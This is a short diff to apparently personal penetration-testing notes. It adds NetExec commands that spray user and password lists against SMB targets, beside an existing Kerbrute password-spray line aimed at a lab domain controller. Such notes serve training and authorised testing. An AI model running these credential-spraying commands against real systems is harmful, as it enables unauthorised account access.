@@ -1,6 +1,9 @@
 ## Linux
 - nxc
-
+```bash
+nxc smb targets.txt -u domain_users.txt -p domain_pass.txt --continue-on-success
+nxc smb targets.txt -u domain_users.txt -p domain_pass.txt --continue-on-success --local-auth
+```
 - Kerbrute
 ```shell-session
 kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
